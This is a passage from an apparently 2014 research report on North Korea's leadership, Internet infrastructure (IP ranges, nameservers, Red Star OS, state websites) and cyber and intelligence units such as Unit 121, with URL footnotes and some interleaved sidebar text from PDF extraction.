soldiers.org%2Fuser_uploads%2Fpdf%2Fkoreademocraticpeoplesrepublicof2639438.pdf&ei=fcyIU_uqCMas0QXUk4DoCw&usg=AFQjCNGOnkQt5ZStqxfc
tKrUY-5IWYSH0A&sig2=ivQLF6lHkSO8Yx9O9VlO4g&bvm = bv.67720277,d.d2k&cad = rja
34
http://www.globalsecurity.org/military/world/dprk/army.htm
35
http://www.globalfirepower.com/
36
http://edition.cnn.com/video/data/2.0/video/international/2014/04/29/north-korea-military-numbers.cnn.html
37
http://www.presstv.com/detail/2013/04/23/299897/facing-food-and-oil-shortages-north-korea-turns-to-iran/
38
http://english.chosun.com/site/data/html_dir/2014/07/02/2014070201995.html
39
http://www.rfa.org/english/news/korea/electricity-10212013160033.html
40
http://edition.cnn.com/2013/04/09/business/north-korea-economy-explainer/
41
http://www.atimes.com/atimes/Korea/GA04Dg01.html
42
http://teacher.scholastic.com/scholasticnews/indepth/north_korea/north-south/index.asp?article=north_korea
43
http://cns.miis.edu/other/pinkston_strategic_insights_sep06.pdf
In recent years , two primary factors have heavily influenced the current state of North Korea ’s
relations with South Korea and her allies : the rise of the regime ’s leader Kim Jong Un and the
inauguration of South Korean president Park Guen Hye . Kim Jong Un officially rose to power in
April 2012 , following the death of his father Kim Jong Il in December 2011 . While his age
remained a mystery for quite some time , it was later revealed that he was born in January 1983 ,
making him age 31 at present . This makes Kim Jong Un the world ’s youngest leader of an
established nation.44 The young leader ’s rise to power brought about several changes in North
Korea . First , Kim Jong Un ’s personal life is more public and more extravagant than that of his
father . Unlike his father , the young Kim is often accompanied by his wife when making public
appearances.45 Second , the young Kim , who is more high - tech than his predecessor , is reported to
have an affinity for luxury items46 and is an avid gamer and basketball fan.47 Third , Kim Jong Un is
more totalitarian than his father . Following his rise to power , the regime reportedly expanded its
labor camps , and more military resources were allocated to target those attempting to defect .
Kim also executed his own uncle , a high - ranking official who did not share his ideals . These moves
indicate the regime ’s priority to deter internal destabilization and dissent , which is perceived to be
a greater threat than outside adversity . According to Phil Robertson , deputy Asia director at
Human Rights Watch , “ The government now recognizes that the accounts of escaping North
Koreans reveal Pyongyang ’s crimes – so it is doing what it can to stop people from fleeing.”48
Under Kim Jong Un ’s rule , the regime has stepped up its nuclear materials production , and the
propaganda distributed by state media has become more menacing.49
The regime ’s response to perceived threats has also become more volatile . Christian Whiton , a
former deputy envoy to North Korea , noted that following Kim Jong Un ’s rise to power , “ the
regime still acts in a very belligerent manner , but it seems less predictable , and more random . ”
Ellen Kim , assistant director of the Korea Chair at the Center for Strategic and International
Studies , assessed the situation thusly : “ Since [ Kim Jong Un ] took power he has purged almost all
of his elder guardians ... and filled his surroundings with new faces . We are in a situation where we
are learning about him a little bit every day through his unpredictable behavior and actions , which
is why the current situation with North Korea is a lot more dangerous than before.”50 The regime ’s
recent reaction to an upcoming film supports these statements . The plot for the comedy film “ The
Interview ” follows two talk show hosts who are asked to assassinate Kim Jong Un . The regime
even sent a complaint about the movie to the UN.51 In response to the film , a North Korean official
stated , “ The enemies have gone beyond the tolerance limit in their despicable moves to dare hurt
the dignity of the supreme leadership . ” The official referred to the movie as " the most undisguised
terrorism and a war action to deprive the service personnel and people of the DPRK of their
mental mainstay and bring down its social system . ” The official also issued a threat : “ If the U.S.
administration connives at and patronizes the screening of the film , it will invite a strong and
merciless countermeasure.”52 This reaction demonstrates North Korea ’s priority of preserving the
44
http://www.theatlantic.com/international/archive/2012/12/kim-jong-uns-age-is-no-longer-a-mystery/265983/
45
http://www.telegraph.co.uk/news/worldnews/asia/northkorea/10522136/Kim-Jong-un-10-ways-North-Koreas-Dear-Leader-is-different.html
46
http://www.huffingtonpost.com/2014/02/18/north-korea-luxury-goods_n_4808823.html
47
http://nypost.com/2011/12/20/kims-007-nut-kid-in-charge/
48
http://www.hrw.org/news/2014/01/21/north-korea-kim-jong-un-deepens-abusive-rule
49
http://www.telegraph.co.uk/news/worldnews/asia/northkorea/10522136/Kim-Jong-un-10-ways-North-Koreas-Dear-Leader-is-different.html
50
http://edition.cnn.com/2014/04/01/world/north-korea-provocation/index.html?iid=article_sidebar
51
http://www.northkoreatech.org/2014/07/10/dprk-takes-the-interview-movie-complaint-to-the-un/
52
http://edition.cnn.com/2014/06/25/world/asia/north-korea-the-interview-reaction/index.html?iid=article_sidebar
regime ’s self - perceived dignity in the global arena and its intolerance of any disrespect directed at
the Kim family .
While tensions between North and South Korea have persisted since the Korean War , these
tensions escalated following the 2013 inauguration of South Korea ’s current president , Park Geun
Hye . Her platform , in her words , is as follows : “ North Korea must keep its agreements made with
South Korea and the international community to establish a minimum level of trust , and second
there must be assured consequences for actions that breach the peace . To ensure stability ,
trustpolitik should be applied consistently from issue to issue based on verifiable actions , and
steps should not be taken for mere political expediency.”53 Shortly after Park ’s inauguration ,
North Korea denounced UN Security Council Resolution 2094 , which is “ a resolution strengthening
and expanding the scope of United Nations sanctions against the Democratic People ’s Republic of
Korea by targeting the illicit activities of diplomatic personnel , transfers of bulk cash , and the
country ’s banking relationships , in response to that country ’s third nuclear test on 12 February
[ 2013].”54 North Korea also responded strongly to joint U.S .- South Korea military exercises in
March 2013 , as is noted later in this paper.55
North Korean cyber capabilities and limitations
North Korean infrastructure
North Korea ’s cyber infrastructure is divided into two major parts : an outward - facing Internet
connection and a regime - controlled intranet . North Korea ’s outward - facing Internet connection is
only available to select individuals and is closely monitored for any activity that is deemed anti-
regime . Individuals using the outward - facing Internet connection must be authorized . In 2013 ,
Jean H. Lee , the Associated Press bureau chief in Pyongyang , stated that foreigners visiting North
Korea are allowed Internet access with no firewalls.56 Common citizens are limited to using the
Kwangmyong ( gwang me - young ) , a nationwide intranet with no access to the world outside North
Korea . 57 According to Lee , Kwangmyong allows citizens “ access to the state media , information
sources that are vetted by the government , and picked and pulled from the Internet and posted to
their intranet site.”58 As of May 2013 , North Korea had only one “ Internet café.”59 A 2003 report
from the Office of the National Counterintelligence Executive stated that North Korea ’s “ Internet
café ” was “ the only place in North Korea for the public to access the Internet ” and that foreigners
were allowed to access the Internet from this café.60 Whether citizens are allowed to access the
Internet from this location is unknown .
Star Joint Venture Co. is responsible for providing North Korea ’s Internet access . Star Joint Venture
Co. was established by the Post and Telecommunications Corporation in cooperation with Loxley
53
http://www.ncnk.org/resources/briefing-papers/all-briefing-papers/an-overview-of-south-korea2019s-dprk-policy
54
http://www.un.org/News/Press/docs/2013/sc10934.doc.htm
55
http://www.ncnk.org/resources/briefing-papers/all-briefing-papers/an-overview-of-south-korea2019s-dprk-policy
56
http://www.austinchronicle.com/daily/sxsw/2013-03-11/social-media-in-north-korea/
57
http://www.computerworld.com/s/article/9177968/North_Korea_moves_quietly_onto_the_Internet?taxonomyId=18&pageNumber=2
58
http://www.austinchronicle.com/daily/sxsw/2013-03-11/social-media-in-north-korea/
59
http://www.washingtonpost.com/blogs/worldviews/wp/2013/01/29/north-koreans-shouldnt-count-on-using-the-new-google-maps/
60
http://www.ncix.gov/publications/archives/docs/NORTH_KOREA_AND_FOREIGN_IT.pdf
Pacific in Thailand.61 In December 2009 , Star Joint Venture became responsible for North Korea ’s
Internet address allocation . Previously , Internet access was provided by a German satellite link via
Korea Computer Center Europe or via direct connections with China Netcom , which was later
merged into China Unicom . 62 By October 2010 , North Korea had made its first known direct
connection to the Internet , hosting an outward - facing Korean Central News Agency website
accessible from the global Internet . 63 However , many of North Korea ’s globally accessible
websites are hosted in other countries . In 2001 , South Korean reports indicated that North Korea
had joined the International Telecommunications Satellite Organization ( INTELSAT).64 As of April
2012 , North Korea reportedly used the Intelsat connection , which appeared in border gateway
protocol ( BGP ) announcements.65 Some reports referred to the Intelsat connection as North
Korea ’s backup Internet connection , in case the China Unicom connection fails.66 A March 2013
post on the blog rdns.im showed that North Korea no longer used the Intelsat connection . In the
blog post , the author noted his method for proving that The Pirate Bay was not hosted in North
Korea . While his analysis of The Pirate Bay ’s hosting is irrelevant to our research , he did detail that
175.45.177.0/24 always routes through AS4837 , and AS131279 . AS131279 is Star - KP , North
Korea ’s Star Joint Venture Company , and AS4837 is China Unicom . The author concluded that “ all
[ traffic ] is ONLY routed through China Unicom and NOT through Intelsat.”67 In February 2014 ,
North Korean and South Korean officials agreed to extend Internet access to Kaesong Industrial
Zone , a jointly operated industrial complex just north of the border . However , this would likely
require a major electrical and network infrastructure expansion.68
North Korea ’s electrical grid can not support a large technological infrastructure.69 Electrical
power is reported to be unreliable and sporadic , with many citizens only receiving a few hours of
electricity per day.70
61
http://www.northkoreatech.org/2011/05/19/more-details-on-star-joint-venture/
62
http://www.computerworld.com/s/article/9177968/North_Korea_moves_quietly_onto_the_Internet?taxonomyId=18&pageNumber=2
63
http://www.northkoreatech.org/2010/10/09/the-new-face-of-kcna/
64
http://webcache.googleusercontent.com/search?q=cache:http://english.chosun.com/site/data/html_dir/2001/05/29/2001052961197.html
65
http://www.northkoreatech.org/2012/04/08/dprk-gets-second-link-to-internet/
66
http://www.computerworld.com/s/article/9237652/North_Korea_39_s_Internet_returns_after_36_hour_outage
67
https://rdns.im/the-pirate-bay-north-korean-hosting-no-its-fake-p2
68
http://www.northkoreatech.org/2014/02/10/internet-coming-to-kaesong-industrial-zone/
69
http://38north.org/2010/09/speak-loudly-and-carry-a-small-stick-the-north-korean-cyber-menace/
70
http://www.usnews.com/news/blogs/rick-newman/2013/04/12/heres-how-lousy-life-is-in-north-korea
Figure 3 North and South Korean power grid
The photo above ( Figure 3 ) , from the International Space Station , shows North Korea ’s sparse
power grid , in comparison with surrounding nations.71 We have highlighted North Korea in red .
Koryolink , the country ’s only cellular phone network,72 is tightly controlled by the regime.73 Cell
phone data plans are not available to most users . Most cellular phones can not access the
Internet and can only make domestic calls.74 According to a 2013 report , North Korea has a 3 G
data network for cellular phones . Visiting reporter Jean H. Lee purportedly used this 3 G network
to post to both Twitter and Instagram . However , citizens are not generally allowed to use the 3 G
network.75
Email is also regulated by the regime . The first email provider in North Korea was Silibank . Silibank
has servers in Pyongyong and Shenyang and is a joint venture with China . The North Korean
Silibank homepage is silibank.net , and the Chinese homepage is silibank.com . In order to use the
email service , users had to initially register , provide personal information , and pay a registration
fee and monthly service fees.76 This registration information was current as of 2001 . However , it
is unknown whether the same process still applies .
WHOIS records for silibank.net show that the site was registered anonymously via a Japanese
registrar . This information can be found in Appendix A at the end of this paper .
71
http://www.citylab.com/work/2014/02/north-korea-night-looks-big-black-hole/8484/
72
http://www.northkoreatech.org/2014/06/24/chinese-shops-offer-cheap-cellphones-to-north-koreans/
73
http://www.defense.gov/pubs/ReporttoCongressonMilitaryandSecurityDevelopmentsInvolvingtheDPRK.pdf
74
http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf
75
http://www.austinchronicle.com/daily/sxsw/2013-03-11/social-media-in-north-korea/
76
http://edition.cnn.com/2001/TECH/internet/11/07/north.korea.email.idg/index.html
Korea Computer Center ( KCC ) is North Korea ’s leading government research center for
information technology . KCC has eleven regional information centers and eight development and
production centers . Other countries with KCC branch offices include China , Syria , Germany , and
United Arab Emirates . KCC has a vested interest in Linux research and is responsible for the
development of North Korea ’s national operating system , Red Star OS , which is discussed in more
detail below . KCC ’s other projects have included a proprietary search engine , a document writer , a
game called Jang - Gi , the Kwangmyong intranet , a food study program , a Korean input method
editor , a pen - based English - Korean and Korean - English translator , Korean voice recognition
software , a video conferencing system , a distance education system , SilverStar Paduk software ,
HMS Player77 , and the Samjiyon tablet . 78 In addition to research and development , KCC also
monitors websites of foreign government and business entities and conducts technical
reconnaissance to blueprint the technical specifications and vulnerabilities in foreign systems and
technologies . KCC has also been involved in clandestine information and cyber operations , serving
as a command center.79
North Korea ’s proprietary operating system is Red Star OS . The development of this Linux - based
operating system started in 2002 . Red Star OS is only offered in the Korean language and
features proprietary software including Naenara ( a Firefox - based browser ) , as well as a text
editor , email client , audio and video players , and games.80 Red Star OS ’s keyboard layouts include
Korean , English , Russian , Chinese , and Japanese . Regime ideals extend to Red Star OS . The
readme file , which goes with the installation disc , reportedly includes a quote from Kim Jong - Il
regarding the importance of North Korea having its own Linux - based operating system that is
compatible with Korean traditions . While prior versions of Red Star were KDE - based , version 3.0
mimics Apple ’s OS X.81 82 This could indicate the regime leader Kim Jong Un ’s preference for the
OS X environment , as Kim reportedly uses an iMac.83 Citizens do not need permission to obtain
Red Star OS . However , the purchase of computers is heavily regulated.84 The OS ’s design suggests
it was developed with means for the regime to monitor user activity.85
North Korea is known to use two IP ranges . 175.45.176.0/22 is North Korea ’s own IP block.86
Additionally , North Korea ’s Telecommunications Ministry is the registered user of China Unicom IP
range 210.52.109.0/24.87 The country ’s only autonomous system ( AS ) number is AS131279 , and
its only peer is AS4837 , the AS for China Unicom.88
North Korea ’s country code top - level domain ( ccTLD ) is .kp . In 2007 , the .kp TLD was initially
delegated to and administered by the German - based KCC Europe.89 After KCC Europe failed to
77
http://www.naenara.com.kp/en/kcc/
78
http://www.northkoreatech.org/2012/09/28/samjiyon-android-tablet-debuts-at-pyongyang-trade-fair/
79
http://www.ists.dartmouth.edu/docs/cyberwarfare.pdf
80
http://ashen-rus.livejournal.com/4300.html
81
http://news.bbc.co.uk/2/hi/technology/8604912.stm
82
http://www.arnnet.com.au/article/537360/north_korea_goes_osx-like_new_operating_system/
83
http://www.businessinsider.com/brand-new-photo-confirms-that-kim-jong-un-is-a-mac-user-2013-3
84
http://rt.com/news/north-korea-cyber-weapon/
85
http://news.bbc.co.uk/2/hi/technology/8604912.stm
86
http://binarycore.org/2012/05/29/investigating-north-koreas-netblock-part-2-dns/
87
https://www.northkoreatech.org/2011/06/26/north-koreas-chinese-ip-addresses/
88
http://binarycore.org/2012/05/29/investigating-north-koreas-netblock-part-2-dns/
89
http://www.northkoreatech.org/2011/05/19/kp-domain-switch-came-after-kcc-europe-disappeared/
maintain the TLD , it was re - delegated to Star Joint Venture Company.90 The .kp TLD uses the
following nameservers and IP addresses:91
Nameserver              IP Address
ns1.kptc.kp             175.45.176.15
ns2.kptc.kp             175.45.176.16
ns3.kptc.kp             175.45.178.173
Various U.S. , U.N , and other sanctions prohibit export of dual - use technologies to North Korea . In
light of this , North Korea has managed to develop both hardware and software and hosts an
annual National Exhibition of Invention and New Technologies to promote its products.92 However ,
the regime has historically failed in its attempts at large - scale production of electronic
components . The country ’s sparse electrical grid is one of the major obstacles hindering large-
scale manufacturing.93 Additionally , the famine in the early 1990 ’s negatively impacted existing
manufacturing facilities , and the regime simply does not have the capital to modernize those
factories.94 A member of the World International Property Organization ( WIPO ) , North Korea joined
the WIPO Patent Cooperation Treaty that protects patents and trademarks worldwide , and
leverages intellectual property laws to ensure Westerners do not take credit for North Korean
inventions.95 The regime , in its efforts to isolate its citizens from Western influence , leverages
intellectual property laws to ensure Westerners do not take credit for North Korean inventions.96
This is ironic since foreign - made electronic components are sometimes smuggled into North
Korea for military use and for personal use by the regime ’s upper echelon .
An analysis of developments in North Korean cyberspace since 2010
A comparison of a scan97 of North Korea ’s IP ranges in November 2010 , just one month after
North Korea made its first direct connection to the Internet , and a series of several scans we
conducted in May 2014 , shows that North Korea has made significant headway in establishing its
Internet presence .
In the November 2010 scan , 175.45.176.0 - 175.45.176.16 showed a variety of devices including
D - link , Cisco , Linksys , HP , and Nokia devices , and a Juniper networks firewall . Operating systems
detected included FreeBSD 6.x , Linux 2.6.x , and Red Hat Enterprise Linux . 175.45.176.14 returned
“ Naenara ” as an html - title . Most hosts in the 175.45.176.xx and 175.45.177.xx ranges were
down . As of 2014 , IP addresses 175.45.176.0 - 175.45.177.255 appear to be used for websites ,
nameservers , databases , email , and voice over IP ( VoIP ) . In November 2010 , the 175.45.178.xx
range showed all hosts down,98 and the 175.45.179.xx range showed most hosts were down.99
90
http://www.iana.org/reports/2011/kp-report-20110401.html
91
http://www.iana.org/domains/root/db/kp.html
92
http://yu.edu/admissions/events/yunmun/WIPO/Libenstein_WIPO_Topic1_HAHS.pdf
93
http://www.apcss.org/Publications/Edited%20Volumes/BytesAndBullets/CH4.pdf
94
http://sinonk.com/2013/10/11/a-primer-on-north-koreas-economy-an-interview-with-andrei-lankov/
95
http://yu.edu/admissions/events/yunmun/WIPO/Libenstein_WIPO_Topic1_HAHS.pdf
96
http://yu.edu/admissions/events/yunmun/WIPO/Libenstein_WIPO_Topic1_HAHS.pdf
97
http://webcache.googleusercontent.com/search?q=cache:http://dprk.sipsik.net/175.45.178.txt
98
http://webcache.googleusercontent.com/search?q=cache:http://dprk.sipsik.net/175.45.178.txt
99
http://webcache.googleusercontent.com/search?q=cache:http://dprk.sipsik.net/175.45.179.txt
In 2014 , several webservers and nameservers were found in the 175.45.178.xx range , and
several nameservers and mail servers were found in the 175.45.179.xx range . This comparison
demonstrates that there has been some growth in DPRK Internet infrastructure over the past four
years . However , it seemingly lags behind even most third world nations . The 2014 scans detected
dated technology that is potentially susceptible to multiple vulnerabilities and consistently
showed the same open ports and active devices on scanned hosts . It is not clear whether the
regime failed to notice and react to the scanning or whether the regime allows these open ports
and devices to be detected or spoofed to serve as a distraction or possible honeypot .
Domains , nameservers , and mail servers present during the May 2014 scan are listed in Appendix
B at the end of this report .
According to Alexa rankings , the three most visited websites in North Korea are kcna.kp , the
official website of the Korean Central News Agency ( KCNA)100 ; rodong.rep.kp , another North
Korean news site101 ; and naenara.com.kp , North Korea ’s official web portal.102 Naenara translates
to “ my country ” .
The kcna.kp site was registered using a Loxley.co.th email address and is administrated by Star
Joint Venture Company . The WHOIS Record can be found in Appendix A.
100
http://dig.do/kcna.kp
101
http://dig.do/rodong.rep.kp
102
http://dig.do/naenara.com.kp
Figure 4 A screenshot from the kcna.kp homepage.103
Rodong.rep.kp was registered using the same loxley.co.th email address and is also administered
by Star Joint Venture Company . The WHOIS Record for this site can be found in Appendix A.
103
http://kcna.kp/kcna.user.home.retrieveHomeInfoList.kcmsf
Figure 5 A screenshot from the rodong.rep.kp homepage.104
The WHOIS information for Naenara.com.kp was not available .
104
http://rodong.rep.kp/ko/
Figure 6 A screenshot of the Naenara.com.kp website.105
In March 2013 , there were reports that the Chrome browser was blocking Naenara.com.kp due to
malware.106
Figure 7 Screenshot of what visitors to Naenara.com.kp saw when using the Chrome browser.107
105
http://naenara.com.kp/en/
106
http://www.nkeconwatch.com/2013/03/25/chrome-blocking-naenara/
107
http://www.nkeconwatch.com/2013/03/25/chrome-blocking-naenara/
Figure 8 Screenshot detailing why Chrome blocked the site108
It is difficult to say whether this incident is a case of North Korea serving malware or whether a
third party took advantage of an improperly secured website .
Several major North Korean websites are hosted outside of North Korea . The popular
Uriminzokkiri.com website , whose name translates to “ our nation , ” is hosted in China . The
administrative contact for the website is Kim Sejun , and the email address given as contact
information is hyk1979@hotmail.com . The WHOIS Record for this site can be found in Appendix A.
108
http://www.nkeconwatch.com/2013/03/25/chrome-blocking-naenara/
Figure 9 A screenshot of the Uriminzokkiri website 109
The website for Kim Il Sung Open University , otherwise known as “ Our Nation School ” is also
hosted in China . The WHOIS record for this site can be found in Appendix A.
109
http://www.uriminzokkiri.com/
Figure 10 A screenshot of ournation-school.com . 110
North Korean cyber war and intelligence structure
At the top of North Korea ’s military structure is the National Defense Commission ( NDC ) . The NDC
is also the highest branch of government and the regime ’s supreme policymaking body . 111 Along
with the Central Committee of the Workers’ Party of Korea and the Cabinet , NDC is at the top of
110
http://www.ournation-school.com/
111
https://nkleadershipwatch.wordpress.com/dprk-security-apparatus/national-defense-commission/
North Korea ’s political hierarchy.112 Article 106 of North Korea ’s Constitution gives the NDC the
following powers:113
 The power to establish policies of the state in accordance with the military - first
revolutionary line .
 The power to guide the armed forces and oversee defense building .
 The power to supervise and ensure the NDC and its chairman ’s orders are executed and to
establish necessary measures .
 The power to override any state decisions or directives that are in opposition to the NDC
or its chairman ’s decisions and directives .
 The power to create or remove central organs of the national defense sector .
 The power to create and bestow military titles above general - grade officer rank .
The NDC oversees several defense and intelligence bodies including the Ministry of State Security ,
the Ministry of People ’s Security , the Ministry of People ’s Armed Forces , and the Korean People ’s
Army . The Ministry of State Security ( MSS ) , also known as the State Security Department , is North
Korea ’s primary counterintelligence service . It is considered an autonomous agent of the regime
and reports directly to leader Kim Jong Un . The MSS ’s duties include oversight of North Korean
prison camps , investigation of domestic espionage , repatriation of defectors , and overseas
counterespionage operations.114 The Ministry of People ’s Security is also known as the Ministry of
Public Security ( MPS ) . Focused on domestic order , it oversees North Korea ’s national police force ,
conducts criminal investigations and preliminary examinations , and oversees correctional
facilities , excluding prison camps.115 While the roles of the MSS and MPS focus more on
intelligence than on cyber operations , the MSS also reportedly has a communications monitoring
and computer hacking group.116
The Ministry of People ’s Armed Forces ( MPAF ) administrates the Korean People ’s Army ( KPA ) and
oversees the General Staff Department ( GSD ) , which is responsible for               Unit 121 comprises both an
operational command and control of North Korea ’s armed forces . The General          intelligence component and
Staff Department also oversees the Reconnaissance General Bureau ( RGB ) , North       an attack component . One of
Unit 121 ’s command posts is
Korea ’s agency for clandestine operations . The RGB has a role in both traditional
Chilbosan Hotel in Shenyang ,
and cyber operations . In the past , the RGB has sent agents on overseas military     China . Unit 121 maintains
assistance missions to train insurgent groups.117 The RGB reportedly has a special technical reconnaissance
operations forces ( SOF ) element118 and oversees six bureaus that specialize in      teams responsible for
infiltration of computer
operations , reconnaissance , technology and cyber matters , overseas intelligence
networks , hacking to obtain
collection , inter - Korean talks , and service support.119 Two of these bureaus have   intelligence , and planting
been identified as the No . 91 Office and Unit 121 . The No . 91 Office , an office     viruses on enemy networks .
responsible for hacking , operates out of the Mangkyungdae - district of
112
http://whataboutnorthkorea.nl/2013/02/the-korean-workers-party/
113
http://asiamatters.blogspot.co.uk/2009/10/north-korean-constitution-april-2009.html
114
http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf
115
http://www.factba.se/handbook-page.php?id=1129700
116
http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/4
117
http://www.strategicstudiesinstitute.army.mil/pdffiles/pub771.pdf
118
http://www.strategicstudiesinstitute.army.mil/pdffiles/pub771.pdf
119
http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf
Pyongyang.120 Unit 121 comprises both an intelligence component and an attack component . Unit
121 ’s headquarters is in the Moonshin - dong area of Pyongyang , near the Taedong River.121 It also
has components that conduct operations from within China . One of Unit 121 ’s command posts is
Chilbosan Hotel122 in Shenyang , the capital of Liaoning Province , which borders North Korea.123
Shenyang is a Chinese military district.124 According to Dr. Alexandre Mansourov , an expert on
North Korea and a visiting scholar at the U.S .- Korea Institute at Johns Hopkins University , " They
[ Unit 121 ] are believed to have conducted hacking operations from inside China that falsify
classified data and disrupt U.S. and South Korean systems."125 Both Unit 121 and an entity known
as Lab 110 are reported to maintain technical reconnaissance teams responsible for infiltrating
computer networks , hacking to obtain intelligence , and planting viruses on enemy networks.126 127
Figure 11 A map pinpointing the location of the Chilbosan Hotel.128
120
http://www.infosecisland.com/blogview/21577-Concerns-Mount-over-North-Korean-Cyber-Warfare-Capabilities.html
121
http://www.aljazeera.com/indepth/features/2011/06/201162081543573839.html
122
http://www.scribd.com/doc/15078953/Cyber-Threat-Posed-by-North-Korea-and-China-to-South-Korea-and-US-Forces-Korea
123
http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/4
124
http://www.defense.gov/pubs/2014_DoD_China_Report.pdf
125
http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/4
126
https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg
127
Clarke , R. A. ( 2012 ) . Cyber war : The next threat to national security and what to do about it . New York , NY : Ecco .
128
maps.google.com
Figure 12 A satellite view of the Chilbosan Hotel.129
Several entities are nested under the Workers’ Party . The Central Party
Committee oversees the Central Party Investigative Group , also known as Unit           The Unification Bureau falls
35 . Unit 35 is reportedly responsible for technical education and training of
130                                                                                under the Workers’ Party . Its
Operations Department is
cyber warriors . The Unification Bureau ’s Operations Department is
131                            132
responsible for cyber-
responsible for cyber - psychological warfare , organizational espionage , and             psychological warfare ,
oversight of Unit 204 . Unit 204 ’s responsibilities include planning and execution      organizational espionage , and
of cyber - psychological warfare operations and technological research . The              oversight of Unit 204 . Unit 204 ’s
responsibilities include planning
Psychological Operations Department of the North Korea Defense Commission
and execution of cyber-
also engages in cyber - psychological warfare.133 The 225th Bureau , or Office 225 ,       psychological warfare operations
is responsible for training agents , infiltration operations in South Korea , and        and technological research . The
creation of underground political parties in order to incite disorder and revolution . Psychological Operations
It plays a more traditional intelligence and psychological operations role , rather     Department of the North Korea
Defense Commission also
than focusing on cyber operations.134 The United Front Department ( UFD )                engages in cyber - psychological
conducts overt operations to create pro - North Korean groups in South Korea .            warfare .
Examples of this activity include the Korean Asia - Pacific Committee and the
Ethnic Reconciliation Council . The UFD also manages inter - Korean dialogue and North Korea ’s
policy toward South Korea . Its operations are also more traditional rather than cyber - focused.135
129
maps.google.com
130
Clarke , R. A. ( 2012 ) . Cyber war : The next threat to national security and what to do about it . New York , NY : Ecco .
131
https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg
132
http://goodfriendsusa.blogspot.co.uk/2008/07/north-korea-today-no174.html
133
https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg
134
http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf
135
http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf
The Liaison Department of the Worker ’s Party oversees a faction of ethnic North Koreans residing
in Japan who are critical to North Korea ’s cyber and intelligence programs . This group , which was
established in 1955 , is referred to by various names including the Chosen Soren , Chongryon , and
the General Association of Korean Residents in Japan.136 The Chongryon ascribe to juche and seek
to preserve North Korean culture while living in Japan . They operate North Korean style schools
and refuse to assimilate with Japanese culture.137 According to Mitsuhiro Suganuma , former
section head of the second intelligence department of the Japanese Public Security Intelligence
Agency ( PSIA ) , “ Chongryon is virtually under the direct control of the Liaison Department of the
Workers’ Party of Korea , which has been in charge of North Korea ’s covert operations and
underground activities against South Korea . Chongryon in Japan has been a strong support
organization aimed at bringing a revolution in South Korea , or a red unification by force . ” He also
stated “ North Korea will continue to make Chongryon serve as Pyongyang ’s pawn in covert
operations against South Korea.”138 The Chongryon are vital to North Korea ’s military budget ,
raising funds via weapons trafficking , drug trafficking , and other black market activities.139 The
group also forms “ front companies ” abroad that benefit the regime by generating
“ Chongryon is virtually
hard currency . One example is Unikotech , which was formed to sell KCC products              under the direct control of
abroad . 140 The Chongryon ’s underground group known as the Gakushu - gumi , or                 the Liaison Department of
“ the study group ” , gathers intelligence for North Korea and helps the regime                the Workers’ Party of Korea ,
which has been in charge of
procure advanced technologies.141 The Chongryon ’s role in North Korean
North Korea ’s covert
intelligence and resource acquisition is discussed below in more detail .                    operations and
underground activities
The regime also has several government bodies under the Cabinet142 that oversee              against South Korea . ”
its infrastructure , intelligence , and technological development . These include the
Central Scientific and Technological Information Agency ( CSTIA ) , the Ministry of Electronics
Industry , and the Ministry of Posts and Telecommunications . The CSTIA collects , analyzes , and
processes data regarding advanced science and technology then sends relevant information to
appropriate areas of the national economy.143 The amount of information contained in CSTIA 's
technical database makes it North Korea 's largest scientific facility . According to a CIA article ,
review of CSTIA ’s publications showed that China , Russia , and Japan are important sources of
technical data . CSTIA ’s publications include newsletters and an 18-volume science and
technology reference series.144 The Ministry of Posts and Telecommunications is the body of
oversight for Star Joint Venture Co.145
136
http://www.moj.go.jp/ENGLISH/PSIA/psia02-03.html
137
http://www.moj.go.jp/ENGLISH/PSIA/psia02-03.html
138
http://www.nknews.org/2014/02/chongryon-still-pyongyangs-pawn-in-covert-operations-former-intelligence-officer/
139
http://www.ists.dartmouth.edu/docs/cyberwarfare.pdf
140
http://www.learningace.com/doc/2025666/863b663a9fb13b456304dd0a3bc43547/cyberwarfare
141
http://www.ists.dartmouth.edu/docs/cyberwarfare.pdf
142
http://whataboutnorthkorea.nl/2013/02/the-korean-workers-party/
143
https://www.cia.gov/library/center-for-the-study-of-intelligence/csi-publications/csi-studies/studies/vol48no1/article04.html
144
https://www.cia.gov/library/center-for-the-study-of-intelligence/kent-csi/vol48no1/pdf/v48i1a04p.pdf
145
https://www.northkoreatech.org/tag/ministry-of-posts-and-telecommunications/
North Korean cyber and intelligence organizational chart
Figure 13 North Korean cyber and intelligence organizational chart
North Korea ’s cyber doctrine , strategies and goals
North Korea ’s cyber warfare doctrine has not been clearly stated . However , based on cultural and
technical observations , we may deduce that North Korea ’s cyber doctrine follows the tenets of
juche nationalism and the songun doctrine .
Although North Korea ’s limited online presence makes a thorough analysis of their cyber warfare
capabilities a difficult task , it must be noted that what is known of those capabilities closely
mirrors their kinetic warfare tactics . Cyber warfare is simply the modern chapter in North Korea ’s
long history of asymmetrical warfare . North Korea has used various unconventional tactics in the
past , such as guerilla warfare , strategic use of terrain , and psychological operations.146 The
regime also aspires to create viable nuclear weapons.147 Asymmetrical warfare is defined as “ a
conflict in which the resources of two belligerents differ in essence and in the struggle , interact
and attempt to exploit each other 's characteristic weaknesses . Such struggles often involve
strategies and tactics of unconventional warfare , the ‘ weaker’ combatants attempting to use
strategy to offset deficiencies in quantity or quality ” . 148
According to the aforementioned report to the House Armed Service Committee , “ Cyber warfare is
an important asymmetric dimension of conflict that North Korea will probably continue to
emphasize — in part because of its deniability and low relative costs.”149 North Korea ’s poor
